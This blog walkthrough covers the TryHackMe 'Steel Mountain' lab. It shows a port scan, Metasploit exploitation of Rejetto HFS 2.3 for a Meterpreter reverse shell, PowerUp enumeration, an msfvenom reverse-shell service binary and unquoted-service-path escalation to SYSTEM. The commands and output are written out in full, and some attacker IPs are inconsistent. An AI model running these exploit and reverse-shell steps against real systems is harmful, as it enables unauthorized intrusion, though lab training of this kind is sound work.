---
author: "fireblood"
date: 2023-05-23
linktitle: Steel Mountain
menu:
  main:
    parent: tryhackme

title: Steel Mountain
weight: 997
tags:
    - Rejetoo
    - HFS
    - Metasploit
    - PowerShell
    - Privilege Escalation
categories:
    - TryHackMe
---

> Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

https://tryhackme.com/r/room/steelmountain

<!--more-->

# Scanning
 
Let's begin by scanning the target. We will first scan the target using Rustscan.

```python
❯ rustscan -a 10.10.70.179 -- -sVC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.70.179:80
Open 10.10.70.179:135
Open 10.10.70.179:139
Open 10.10.70.179:445
Open 10.10.70.179:3389
Open 10.10.70.179:5985
Open 10.10.70.179:8080
Open 10.10.70.179:47001
Open 10.10.70.179:49156
Open 10.10.70.179:49153
Open 10.10.70.179:49155
Open 10.10.70.179:49170
Open 10.10.70.179:49169
Open 10.10.70.179:49154
Open 10.10.70.179:49152
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC" on ip 10.10.70.179
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-23 22:58 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:58
Completed NSE at 22:58, 0.00s elapsed
Initiating Ping Scan at 22:58
Scanning 10.10.70.179 [4 ports]
Completed Ping Scan at 22:58, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:58
Completed Parallel DNS resolution of 1 host. at 22:58, 0.11s elapsed
DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:58
Scanning 10.10.70.179 [15 ports]
Discovered open port 445/tcp on 10.10.70.179
Discovered open port 3389/tcp on 10.10.70.179
Discovered open port 8080/tcp on 10.10.70.179
Discovered open port 80/tcp on 10.10.70.179
Discovered open port 139/tcp on 10.10.70.179
Discovered open port 135/tcp on 10.10.70.179
Discovered open port 47001/tcp on 10.10.70.179
Discovered open port 49170/tcp on 10.10.70.179
Discovered open port 49153/tcp on 10.10.70.179
Discovered open port 49154/tcp on 10.10.70.179
Discovered open port 49156/tcp on 10.10.70.179
Discovered open port 49155/tcp on 10.10.70.179
Discovered open port 49152/tcp on 10.10.70.179
Discovered open port 49169/tcp on 10.10.70.179
Discovered open port 5985/tcp on 10.10.70.179
Completed SYN Stealth Scan at 22:58, 0.27s elapsed (15 total ports)
Initiating Service scan at 22:58
Scanning 15 services on 10.10.70.179
Service scan Timing: About 53.33% done; ETC: 23:00 (0:00:49 remaining)
Completed Service scan at 22:59, 76.97s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.70.179.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 5.85s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.54s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Nmap scan report for 10.10.70.179
Host is up, received reset ttl 125 (0.13s latency).
Scanned at 2024-05-23 22:58:33 EDT for 84s

PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 125 Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-05-23T02:56:08
| Not valid after:  2024-11-22T02:56:08
| MD5:   6e4d153ae7ee1b320d9d72afe32c2c46
| SHA-1: a0ccbed37da0eee5c10a1ebd4d6076f8f937545e
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQautoTBW/+rhJokpnnG26hjANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDUyMzAyNTYwOFoXDTI0MTEy
| MjAyNTYwOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAN3PQ47ytbMM3aObC6EF69B0V7Iex2ys1WYOJZGo
| 8CDMjdF29eM0rBRlEc7xuXQRX8UM7IkKUORcRHJsklrJgtvDg6q8LKucJL4Zj55k
| 5lO2yzBlgPFg1X5zFjlXEu+Ytg8u7Q0WndlU28Jq4bYmspuapajhB97pPxdJ3cv4
| Q32mZE4cwyXIRE/CCX7RvTLpFUXJT2Vqu917y8XUeXI4uO1zMU6F5PRyLLx1T3MS
| Kq/IN4FvqE8Af+T9UYkGCD+TXrIG14RZ7GisgoeR5BXnB7wPhRhJfb0NjpAeWSu3
| vJE+RzlcGzszwxoBdR/E/ufXbJX8FY69o9YiUNrG8VVkoDMCAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQBG/Ec+cj2a6PMxM7aUswvDGShDvneTBiwDcjRQmz4Vo7z3M5KLku1tTmgzHp/O
| 1IH9aNmXWZK2VA42i6bKLIuJ57/7AhAwMbDIgFdck2ddkXGHP11qe2GroMExUEA8
| W7xRe8+RQ37ytWxB7fEn9VXAMsnV3h8bby1uNmnrmVoGbfMiP0Y6i2NijngVAJrf
| /tBVFR7rjwjhg7b9GiDTXlnFNjZI/Wo9ThfhWR3grvEOMoPKaBUPkG7QzCQpoeDw
| uA8gTVdJTTqoIaVQGvG5w1+xj1NQplP86/UZhVVQy/TzNJMtiRqhJeH1MAyaZTO7
| NnTbtK6ktlldHTWURZkG9J2P
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-05-24T02:59:51+00:00
|_ssl-date: 2024-05-24T02:59:56+00:00; 0s from scanner time.
5985/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               syn-ack ttl 125 HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-title: HFS /
47001/tcp open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49169/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49170/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33062/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19020/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53324/udp): CLEAN (Timeout)
|   Check 4 (port 25253/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02e7560a719d (unknown)
| Names:
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   STEELMOUNTAIN<20>    Flags: <unique><active>
| Statistics:
|   02e7560a719d0000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-time: 
|   date: 2024-05-24T02:59:50
|_  start_date: 2024-05-24T02:56:01
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:59
Completed NSE at 22:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.37 seconds
           Raw packets sent: 19 (812B) | Rcvd: 16 (700B)
```

# Enumeration

There are a lot of ports open and since port 80 is open we will check what's running on that port.

There is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.

While opening the image in a new tab we can see the name of the image as Bill Harper.

> http://10.10.70.179/img/BillHarper.png

Now, we will check what's running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3. 

```python
#Server information
HttpFileServer 2.3
Server time: 5/23/2024 8:04:24 PM
Server uptime: 00:07:51 
```

On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.

```html
<fieldset id='serverinfo'>
	<legend><img src="/~img0"> Server information</legend>
	<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
	<br />Server time: 5/23/2024 8:05:49 PM
	<br />Server uptime: 00:09:15
</fieldset>
```

# Exploitation

We will search in metasploit if we can find any exploits.

```python
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > info 0

       Name: Rejetto HttpFileServer Remote Command Execution
     Module: exploit/windows/http/rejetto_hfs_exec
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-09-11

Provided by:
  Daniele Linguaglossa <danielelinguaglossa@gmail.com>
  Muhamad Fadzil Ramli <mind1355@gmail.com>
```

We found a module which is successfully tested on the version 2.3b. So, we will use this.

```python
Description:
  Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
  poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by
  using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b
  over Windows XP SP3, Windows 7 SP1 and Windows 8.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-6287
  OSVDB (111386)
  https://seclists.org/bugtraq/2014/Sep/85
  http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands
```

We will set all the required options.

```python
set rhost 10.10.70.179
```

```python
set rport 8080
```

```python
set lhost tun0
```

Run the exploit.

```python
exploit
```

```python
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.6.10.164:4444 
[*] Using URL: http://10.6.10.164:8080/okBb9lTf
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /okBb9lTf
[*] Sending stage (175686 bytes) to 10.10.70.179
[!] Tried to delete %TEMP%\cGZQGuu.vbs, unknown result
[*] Meterpreter session 1 opened (10.6.10.164:4444 -> 10.10.70.179:63844) at 2024-05-23 23:14:00 -0400
[*] Server stopped.

meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```

We got the meterpreter reverse shell and we can read the user flag.

```python
meterpreter > shell
Process 1056 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Users\Bill\Desktop
cd c:\users\bill\desktop

c:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\bill\Desktop

09/27/2019  09:08 AM    <DIR>          .
09/27/2019  09:08 AM    <DIR>          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,155,789,312 bytes free

c:\Users\bill\Desktop>

```

# Privilege Escalation

Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.

Let's upload it to the target.

```shell
upload powerup.ps1
```

```python
meterpreter > upload powerup.ps1
[*] Uploading  : /root/tryhackme/powerup.ps1 -> powerup.ps1
[*] Uploaded 483.26 KiB of 483.26 KiB (100.0%): /root/tryhackme/powerup.ps1 -> powerup.ps1
[*] Completed  : /root/tryhackme/powerup.ps1 -> powerup.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > dir


    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         5/23/2024   8:13 PM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---         5/23/2024   8:19 PM     494860 powerup.ps1


PS > 
```

Load the powershell module and use powershell.
```shell
load powershell
```
```shell
powershell_shell
```

Run the script PowerUp.ps1 that we just downloaded into the target and run it.

```shell
. .\powerup.ps1
```

We will now run all the checks in this module using the following command.
```shell
Invoke-AllChecks
```
```shell
PS > . .\powerup.ps1
PS > Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...

ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AdvancedSystemCareService9' -Path <HijackPath>

ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : IObitUnSvr
Path          : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'IObitUnSvr' -Path <HijackPath>

ServiceName   : LiveUpdateSvc
Path          : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'LiveUpdateSvc' -Path <HijackPath>

[*] Checking service executable and argument permissions...

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'IObitUnSvr'

[*] Checking service permissions...

[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Windows\system32\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Windows\System32\WindowsPowerShell\v1.0\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll' -Command '...'
```

When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks.  More information on unquoted service path vulnerability can be found [here.](https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/) 

```python
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.70.179 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: Advanced.exe
```

For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.

```shell
upload Advanced.exe
```

```shell
meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-05-23 23:26:39 -0400  %TEMP%
100777/rwxrwxrwx  15872   fil   2024-05-23 23:27:14 -0400  Advanced.exe
100666/rw-rw-rw-  10178   fil   2024-05-23 23:23:18 -0400  Invoke-AllChecks
100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 15:58:52 -0500  hfs.exe
100666/rw-rw-rw-  494860  fil   2024-05-23 23:19:57 -0400  powerup.ps1
```

Open another terminal and use netcat listener on port 4443 to get the reverse shell.
```shell
nc -lnvp 4443
```
<img src="{{'/assets/img/images/04.Steel-Mountain/21.png' | prepend: site.baseurl }}" height="200">

Now, load the command prompt shell using the command in the meterpreter shell.

```shell
shell
```

Restart the AdvancedSystemCareService9 service by using the following commands.

```shell
sc stop AdvancedSystemCareService9
```
```shell
sc start AdvancedSystemCareService9
```

Now we get a reverse shell in the other terminal window running as system32!

```shell
❯ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.6.29.149] from (UNKNOWN) [10.10.70.179] 49343
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C: \Windows\system32>
```
